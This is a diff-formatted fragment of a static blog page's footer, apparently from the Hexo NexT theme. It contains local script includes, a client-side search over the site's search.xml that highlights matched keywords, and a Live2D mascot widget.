+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
